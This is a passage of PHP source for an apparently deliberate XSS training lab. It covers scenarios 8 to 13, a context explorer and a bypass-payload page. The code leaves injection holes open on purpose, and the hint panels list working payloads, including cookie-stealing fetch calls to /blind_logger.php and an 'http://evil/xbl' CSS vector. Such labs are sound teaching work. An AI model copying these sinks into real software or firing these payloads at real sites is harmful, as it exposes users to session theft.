    echo '<div class="card scenario" data-scenario-id="s8" data-scenario-index="8" data-scenario-award="playground-s8" data-scenario-requires="playground-s7">';
    echo '<div class="section-title">Scenario 8 (Medium→Hard): Query-driven widget (DOM)</div>';
    echo '<div class="small">A marketing widget reads <code>?widget=</code> and drops it directly into a dashboard slot. Assume the CMS controls the value—but you can override it.</div>';
    xp_marker('playground-s8', 'Injected Scenario 8 query widget', 35);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><input type="hidden" name="scenario_view" value="s8"><div class="form-row"><input class="input" name="widget" value="'.htmlspecialchars($widget, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Widget markup or payload"><span class="input-hint">Deliver HTML or script snippets via the URL.</span></div><div class="form-row"><button class="button">Load widget</button></div></form>';
    echo '<div class="results"><div class="results-title">Widget container</div><div id="widget-preview" class="results-body">(Set <code>?widget=</code> to populate this box)</div></div>';
    tip_vault('tips-playground-s8', 8, 'Scenario 8 widget takeover', [
        [
            'title' => 'Control the query parameter',
            'items' => [
                "Set <code>?widget=%3Ch2%3EInjected%3C/h2%3E</code> to confirm the value renders as HTML in the container.",
                "Remember the preview uses <code>innerHTML</code>; anything you pass through the URL executes on load."
            ]
        ],
        [
            'title' => 'Drop malicious markup',
            'items' => [
                "Use <code>?widget=%3Cimg%20src%3Dx%20onerror%3Dalert('S8')%3E</code> or <code>?widget=%3Cscript%3Ealert(1)%3C/script%3E</code> for instant execution.",
                "If you prefer stealth, inject a hidden form that auto-posts cookies back to your server."
            ]
        ],
        [
            'title' => 'Chain with other labs',
            'items' => [
                "Capture the working payload and reuse it in the DOM lab or Scenario 12—they share the same <code>innerHTML</code> sink.",
                "Demonstrate impact by exfiltrating <code>document.cookie</code> to <code>/blind_logger.php</code>."
            ]
        ]
    ]);
    echo '<script>(function(){var params=new URLSearchParams(window.location.search);var widget=params.get("widget");if(widget){document.getElementById("widget-preview").innerHTML=widget;}})();</script>';
    echo '</div>';

    // Scenario 9: analytics config in inline script (hard)
    $analyticsId = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'analytics_config'){
        $analyticsId = $_POST['analytics_id'] ?? '';
    }
    echo '<div class="card scenario" data-scenario-id="s9" data-scenario-index="9" data-scenario-award="playground-s9" data-scenario-requires="playground-s8">';
    echo '<div class="section-title">Scenario 9 (Hard): Legacy analytics config (inline JS)</div>';
    echo '<div class="small">Operations paste an analytics ID that lands inside a script assignment. There is no escaping—close the string and run your own code.</div>';
    xp_marker('playground-s9', 'Escalated Scenario 9 analytics config', 40);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="analytics_config"><input type="hidden" name="scenario_view" value="s9"><div class="form-row"><input class="input" name="analytics_id" value="'.htmlspecialchars($analyticsId, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Analytics ID"><span class="input-hint">Try payloads like <code>"};alert(1);//</code>.</span></div><div class="form-row"><button class="button">Generate snippet</button></div></form>';
    tip_vault('tips-playground-s9', 8, 'Scenario 9 string escape tips', [
        [
            'title' => 'Read the script snippet',
            'items' => [
                "The generated code is <code>window.analyticsConfig = { id: &quot;VALUE&quot;, sampleRate: 0.5 };</code>—your input sits inside a double-quoted string.",
                "Any double quote you inject will close the string and give you control of the remaining script."
            ]
        ],
        [
            'title' => 'Break the assignment cleanly',
            'items' => [
                "Use <code>&quot;};alert('S9');//</code> to close the string, terminate the object, execute code, and comment the rest.",
                "Alternatively, inject <code>&quot;, sampleRate: 0.5 }; fetch('/blind_logger.php?p='+document.cookie); //</code> to keep the object valid and run extra JavaScript."
            ]
        ],
        [
            'title' => 'Prove the risk',
            'items' => [
                "After injecting, reload the page to see the malicious script execute immediately—demonstrating stored configuration compromise.",
                "Record the payload and reuse it in Scenario 5 or other inline-script bugs with similar concatenation patterns."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Generated script</div><div class="results-body"><pre>';
    if ($analyticsId === ''){
        echo 'window.analyticsConfig = { id: "YOUR-ID", sampleRate: 0.5 };';
    } else {
        echo 'window.analyticsConfig = { id: "'.$analyticsId.'", sampleRate: 0.5 };';
    }
    echo '</pre></div></div>';
    if ($analyticsId !== ''){
        echo '<script>window.analyticsConfig = { id: "'.$analyticsId.'", sampleRate: 0.5 };</script>';
    }
    echo '</div>';

    // Scenario 10: CSS injection (hard)
    $cssNote = $_GET['cssnote'] ?? '';
    echo '<div class="card scenario" data-scenario-id="s10" data-scenario-index="10" data-scenario-award="playground-s10" data-scenario-requires="playground-s9">';
    echo '<div class="section-title">Scenario 10 (Hard): Inline CSS memo</div>';
    echo '<div class="small">A style attribute is assembled from user input to let managers tweak colours. Abuse CSS escapes or <code>url()</code> tricks to trigger script execution in older browsers.</div>';
    xp_marker('playground-s10', 'Abused Scenario 10 CSS injection', 40);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><input type="hidden" name="scenario_view" value="s10"><div class="form-row"><input class="input" name="cssnote" value="'.htmlspecialchars($cssNote, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="CSS fragment"><span class="input-hint">Start with harmless values, then attempt <code>background:url(javascript:...)</code>.</span></div><div class="form-row"><button class="button">Render memo</button></div></form>';
    echo '<div class="results"><div class="results-title">Memo card</div><div class="results-body"><div class="memo-card" style="padding:14px;border-radius:12px;background:rgba(17,28,45,0.6);'.$cssNote.'">Team reminder: sanitise everything.</div></div></div>';
    tip_vault('tips-playground-s10', 8, 'Scenario 10 CSS pivot', [
        [
            'title' => 'Understand the context',
            'items' => [
                "Your input is appended directly inside a <code>style=</code> attribute. No quotes are added, so supply valid CSS fragments.",
                "Inspect the rendered card to confirm your text appears after the default background styles."
            ]
        ],
        [
            'title' => 'Trigger execution',
            'items' => [
                "Use <code>background:url(javascript:alert('S10'))</code> for legacy browsers that still honour <code>javascript:</code> URLs in CSS.",
                "Try <code>content:&quot;\\41&quot;; -moz-binding:url('http://evil/xbl')</code> style payloads to explore historical CSS vectors."
            ]
        ],
        [
            'title' => 'Demonstrate data theft',
            'items' => [
                "Combine CSS with HTML injection: close the attribute using <code>&#96;;}</code> then append <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.",
                "Log successful CSS payloads for future use in applications that naively concatenate styles."
            ]
        ]
    ]);
    echo '</div>';

    // Scenario 11: stored email template with entity decode (hard)
    $emailNotice = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'email_template'){
        $subject = trim($_POST['subject'] ?? '');
        $body = $_POST['body'] ?? '';
        $payload = json_encode(['subject'=>$subject,'body'=>$body], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'email_template', ':content'=>$payload]);
        $emailNotice = '<div class="notice success">Template saved. The preview uses <code>html_entity_decode</code> which revives encoded payloads.</div>';
    }
    $emailStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 10');
    $emailStmt->execute([':scenario'=>'email_template']);
    $emailRows = $emailStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario" data-scenario-id="s11" data-scenario-index="11" data-scenario-award="playground-s11" data-scenario-requires="playground-s10">';
    echo '<div class="section-title">Scenario 11 (Hard): Email broadcast builder (stored)</div>';
    echo '<div class="small">Marketers encode dangerous characters before saving, but the preview conveniently calls <code>html_entity_decode</code> for readability.</div>';
    xp_marker('playground-s11', 'Revived Scenario 11 encoded payload', 40);
    if ($emailNotice !== ''){
        echo $emailNotice;
    }
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="email_template"><input type="hidden" name="scenario_view" value="s11"><div class="form-row"><input class="input" name="subject" placeholder="Email subject"><span class="input-hint">Subjects are escaped correctly.</span></div><div class="form-row"><textarea class="input" name="body" rows="4" placeholder="Email body (HTML allowed)"></textarea><span class="input-hint">Store <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code> to revive later.</span></div><div class="form-row"><button class="button">Save template</button></div></form>';
    echo '<div class="results"><div class="results-title">Template preview</div>';
    if (count($emailRows) === 0){
        echo '<div class="small">No templates yet. Save one to populate the preview.</div>';
    }
    tip_vault('tips-playground-s11', 9, 'Scenario 11 entity escape plan', [
        [
            'title' => 'Probe the encoding',
            'items' => [
                "Save <code>&amp;lt;strong&amp;gt;hi&amp;lt;/strong&amp;gt;</code> in the body and watch the preview convert it back to bold text.",
                "Note that only the subject is safely escaped—the body passes through <code>html_entity_decode</code> before rendering."
            ]
        ],
        [
            'title' => 'Recover a payload',
            'items' => [
                "Store <code>&amp;lt;img src=x onerror=alert('S11')&amp;gt;</code>; the preview decodes entities and executes the script.",
                "Experiment with double-encoded entities (<code>&amp;amp;lt;script&amp;amp;gt;</code>) to confirm only a single decode occurs."
            ]
        ],
        [
            'title' => 'Show business impact',
            'items' => [
                "Replace <code>alert</code> with a call to <code>fetch('/blind_logger.php?p='+encodeURIComponent(document.cookie))</code> to demonstrate stolen data.",
                "Export the preview HTML (View Source) to evidence that marketing emails could deliver XSS to every recipient."
            ]
        ]
    ]);
    foreach ($emailRows as $row){
        $decoded = json_decode($row['content'], true);
        $subject = htmlspecialchars($decoded['subject'] ?? '(no subject)');
        $body = $decoded['body'] ?? '';
        $previewBody = html_entity_decode($body, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$subject.'</strong></div><div class="wall-body">'.$previewBody.'</div></div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 12: hash router (expert)
    echo '<div class="card scenario" data-scenario-id="s12" data-scenario-index="12" data-scenario-award="playground-s12" data-scenario-requires="playground-s11">';
    echo '<div class="section-title">Scenario 12 (Expert): Hash-driven router (DOM)</div>';
    echo '<div class="small">A single-page app loads modules based on <code>location.hash</code>. Whatever sits after <code>#</code> is decoded and pushed into <code>innerHTML</code>.</div>';
    xp_marker('playground-s12', 'Hijacked Scenario 12 hash router', 45);
    echo '<div class="form-row"><input class="input" id="hash-input" placeholder="Fragment payload"><span class="input-hint">Idea: <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code>.</span></div>';
    echo '<div class="form-row"><button class="button" id="hash-apply">Update hash</button></div>';
    echo '<div class="results"><div class="results-title">Router outlet</div><div id="hash-outlet" class="results-body">(No fragment set)</div></div>';
    tip_vault('tips-playground-s12', 9, 'Scenario 12 router strategy', [
        [
            'title' => 'Map the router',
            'items' => [
                "Check the script: it decodes <code>location.hash</code> and writes it straight into <code>innerHTML</code>.",
                "Use the button to set <code>#%3Cstrong%3EInjected%3C/strong%3E</code> and confirm the outlet updates immediately."
            ]
        ],
        [
            'title' => 'Launch the payload',
            'items' => [
                "Apply <code>#%3Cimg%20src%3Dx%20onerror%3Dalert('S12')%3E</code> to trigger JavaScript each time the hash loads.",
                "Remember hashes persist in the URL—share the crafted link to exploit other users instantly."
            ]
        ],
        [
            'title' => 'Escalate to data theft',
            'items' => [
                "Swap <code>alert</code> for a <code>fetch</code> request to <code>/blind_logger.php</code> to capture cookies.",
                "Chain the payload with <code>history.pushState</code> to maintain the malicious fragment while hiding evidence."
            ]
        ]
    ]);
    echo '<script>(function(){var input=document.getElementById("hash-input");var apply=document.getElementById("hash-apply");var outlet=document.getElementById("hash-outlet");function render(){var frag=location.hash.slice(1);if(frag){outlet.innerHTML=decodeURIComponent(frag);}else{outlet.textContent="(No fragment set)";}}apply.addEventListener("click",function(e){e.preventDefault();location.hash=input.value;});window.addEventListener("hashchange",render);render();})();</script>';
    echo '</div>';

    // Scenario 13: template literal injection (expert)
    $templateLiteral = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'template_literal'){
        $templateLiteral = $_POST['template_payload'] ?? '';
    }
    echo '<div class="card scenario" data-scenario-id="s13" data-scenario-index="13" data-scenario-award="playground-s13" data-scenario-requires="playground-s12">';
    echo '<div class="section-title">Scenario 13 (Expert): Template literal helper</div>';
    echo '<div class="small">Developers stuff untrusted input into ES6 template literals to render toast messages. Break out using backticks or <code>${...}</code> expressions.</div>';
    xp_marker('playground-s13', 'Popped Scenario 13 template literal', 45);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="template_literal"><input type="hidden" name="scenario_view" value="s13"><div class="form-row"><textarea class="input" name="template_payload" rows="3" placeholder="Message or payload">'.htmlspecialchars($templateLiteral, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Try: <code>`;alert(document.domain);//</code>.</span></div><div class="form-row"><button class="button">Render toast</button></div></form>';
    tip_vault('tips-playground-s13', 10, 'Scenario 13 template tactics', [
        [
            'title' => 'Inspect the snippet',
            'items' => [
                "The code builds <code>const message = `VALUE`;</code> and passes it to <code>showToast()</code>.",
                "Template literals allow both backtick escapes and <code>\${...}</code> expression injection."
            ]
        ],
        [
            'title' => 'Break the template',
            'items' => [
                "Enter <code>`;alert('S13');//</code> to close the literal, execute code and comment the trailing backtick.",
                "Use <code>\${fetch('/blind_logger.php?p='+document.cookie)}</code> to inject an expression without closing the literal."
            ]
        ],
        [
            'title' => 'Persist and prove impact',
            'items' => [
                "Observe the console log—your payload runs immediately after submission, proving client-side compromise.",
                "Store the working string for future audits of modern JavaScript apps that rely on template literals."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Script output</div>';
    if ($templateLiteral === ''){
        echo '<div class="results-body"><pre>const message = `Welcome back!`;
showToast(message);</pre></div>';
    } else {
        echo '<div class="results-body"><pre>const message = `'.$templateLiteral.'`;
showToast(message);</pre></div>';
        echo '<script>const message = `'.$templateLiteral.'`;if(window.console){console.log("Toast:", message);}</script>';
    }
    echo '</div>';
    echo '</div>';

    echo '</div>';
    xp_marker('playground-finale', 'Completed the 13-scenario playground gauntlet', 60);
    echo '<div class="meta"><strong>Wrap-up</strong><ol class="lab-steps"><li>Work through scenarios 1 → 13 to feel the escalation from easy reflections to expert-only template escapes.</li><li>Reset each scenario and attempt different payload styles (event handlers, <code>javascript:</code> URLs, encoded attacks).</li><li>Document which defences are missing and how you would fix them. Share successful payloads back in the bypass library so future you can reuse them.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'contexts'){
    header_html('XSS Contexts Explorer', 'contexts');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Payload behaviour changes depending on the surrounding context. Use this explorer to see how the same string behaves in multiple locations.</div></div>';
    xp_marker('contexts-tour', 'Mapped payload behaviour across contexts', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Input a payload that mixes quotes, tags and JavaScript.</li><li>Note which contexts render, escape or break on your payload.</li><li>Adjust encoding to target specific contexts (attribute vs. JS string etc.).</li><li>Record working variants for future engagements.</li></ol></div>';
    // contexts: html body, attribute, js string, url param, style
    echo '<form method="GET" action="?page=contexts">';
    echo '<div class="form-row"><input class="input" name="c" data-field="contexts-input" placeholder="Payload to test (e.g. \'\' onmouseover=alert(1) )"><span class="input-hint">Try combining quotes to break attributes and strings.</span></div>';
    echo '<div class="form-row"><button class="button">Test contexts</button></div>';
    echo '</form>';
    $c = $_GET['c'] ?? '';
    tip_vault('tips-contexts', 6, 'Contexts explorer hints', [
        [
            'title' => 'Start with a multi-context payload',
            'items' => [
                "Use <code>'&quot;)&lt;svg/onload=alert(1)&gt;</code> to observe how the same string behaves in HTML, attribute, JS string, and URL contexts.",
                "Record which sections break or encode the payload—those reactions tell you which characters each context treats specially."
            ]
        ],
        [
            'title' => 'Tune per context',
            'items' => [
                "For the attribute example, escape the surrounding quotes with <code>&quot;</code> or <code>'</code> and then inject an event handler.",
                "For the JavaScript string, add <code>\"</code> to escape and then <code>;alert(1)//</code> to execute code." 
            ]
        ],
        [
            'title' => 'Map findings back to labs',
            'items' => [
                "If the URL context executes <code>javascript:</code>, reuse that insight in Playground Scenario 4 (attribute) and Scenario 8 (DOM widget).",
                "Document the payload variants that survive each context and add them to your bypass notes for quick reference."
            ]
        ]
    ]);
    echo '<div class="context-grid">';
    echo '<div><div class="analysis-label">HTML body</div><div class="results">'. $c .'</div><div class="context-note small">Rendered with no encoding. Perfect for testing straight injections.</div></div>';
    echo '<div><div class="analysis-label">HTML attribute</div><div class="results"><div><button '.$c.'>Example button</button></div></div><div class="context-note small">Break out of the attribute with quotes or angle brackets.</div></div>';
    echo '<div><div class="analysis-label">JavaScript string</div><div class="results"><script>var s = "'.str_replace('"','\"',$c).'";console.log(s);</script><div class="small">(Check the console to confirm execution)</div></div><div class="context-note small">Escape double quotes with \" to stay inside the string.</div></div>';
    echo '<div><div class="analysis-label">URL / href</div><div class="results"><a href="'.htmlspecialchars($c).'">Click me (href)</a></div><div class="context-note small">Try javascript: payloads or protocol-relative URLs.</div></div>';
    echo '<div><div class="analysis-label">CSS</div><div class="results"><div style="width:100%;height:30px;'.htmlspecialchars($c).'">Box</div></div><div class="context-note small">Some browsers execute JavaScript via CSS expressions in legacy modes.</div></div>';
    echo '</div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'bypasses'){
    header_html('Filter bypasses (examples increasing difficulty)', 'bypasses');
    // load bypass file
    $bf = __DIR__ . '/bypasses.txt';
    $content = is_file($bf) ? file_get_contents($bf) : '';
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">A grab bag of payloads for when filters attempt to block scripts. Start with the basics then escalate to more obscure vectors.</div></div>';
    xp_marker('bypass-library', 'Logged new payloads in the bypass library', 25);
    echo '<div class="section"><div class="section-title">How to practice</div><ol class="lab-steps"><li>Load a filter level in the Filter Lab.</li><li>Work down the list until one executes.</li><li>Note why it worked (protocol change, event handler, SVG, etc.).</li><li>Craft your own variant and append it to the list for future runs.</li></ol></div>';

    if (!$content){
        echo '<div class="notice">No bypass file found.</div>';
    } else {
        tip_vault('tips-bypass', 6, 'Bypass library guidance', [
            [
                'title' => 'Triage the list',
                'items' => [
                    "Start with the lower numbered payloads—they are intentionally easy wins for <code>strip_tags</code> or naive filters.",
                    "Use <code>Group</code> headers to jump straight to SVG, attribute, or JavaScript-specific payload families."
                ]
            ],
            [
                'title' => 'Record your results',
                'items' => [
                    "When a payload works, copy the exact filter level and context so you can justify the bypass later.",
                    "Add your own payloads by editing <code>bypasses.txt</code>; new lines automatically appear in the accordion."
                ]
            ],
            [
                'title' => 'Cross-reference other labs',
                'items' => [
                    "After finding a bypass, retry it in the Filter Lab or Playground scenarios to see where else it executes.",
                    "Log blind-capable payloads (those that call external endpoints) for quick reuse in the blind XSS lab."
                ]
            ]
        ]);
        $lines = preg_split('/\r?\n/', $content);
        $groups = [];
        $currentIndex = null;
        foreach ($lines as $line){
            $trimmed = trim($line);
            if ($trimmed === ''){
                continue;
            }
            if (preg_match('/^#\s*Group\s+/i', $trimmed)){
                $groups[] = [
                    'title' => $trimmed,
                    'items' => []
                ];
                $currentIndex = count($groups) - 1;
                continue;
            }
            if (strpos($trimmed, '#') === 0){
                continue;
            }
            if ($currentIndex === null){
                $groups[] = [
                    'title' => 'Ungrouped bypasses',
                    'items' => []
                ];
                $currentIndex = 0;
            }
            $num = null;
            $payload = $trimmed;
            if (preg_match('/^(\d+)\)\s*(.+)$/', $trimmed, $matches)){
                $num = (int)$matches[1];
                $payload = $matches[2];
            }
            $groups[$currentIndex]['items'][] = [
                'num' => $num,
                'payload' => $payload
            ];
        }

        echo '<div class="bypass-accordion">';
        foreach ($groups as $group){
            $items = $group['items'];
            if (!$items){
                continue;
            }
            $numericItems = array_values(array_filter($items, function($item){
                return $item['num'] !== null;
            }));
            $hasNumbers = !empty($numericItems);
            $start = $hasNumbers ? $numericItems[0]['num'] : 1;
            $count = count($items);
            echo '<details class="bypass-group">';
            echo '<summary class="bypass-summary"><span class="bypass-group-title">'.htmlspecialchars($group['title']).'</span><span class="bypass-count">'.$count.' payload'.($count === 1 ? '' : 's').'</span></summary>';
            echo '<div class="bypass-items">';
            if ($hasNumbers){
                echo '<ol class="bypass-listing" start="'.(int)$start.'">';
                foreach ($items as $item){
                    $label = htmlspecialchars($item['payload'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
                    echo '<li class="bypass-item"><code>'.$label.'</code></li>';
                }
                echo '</ol>';
            } else {
                echo '<ul class="bypass-listing">';
                foreach ($items as $item){
                    $label = htmlspecialchars($item['payload'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
                    echo '<li class="bypass-item"><code>'.$label.'</code></li>';
                }
                echo '</ul>';
            }
            echo '</div>';
            echo '</details>';
        }
        echo '</div>';
    }
    footer_html();
    exit;
}

// default fallback
header_html('Unknown', $page);
echo '<div class="small">Unknown page.</div>';
footer_html();
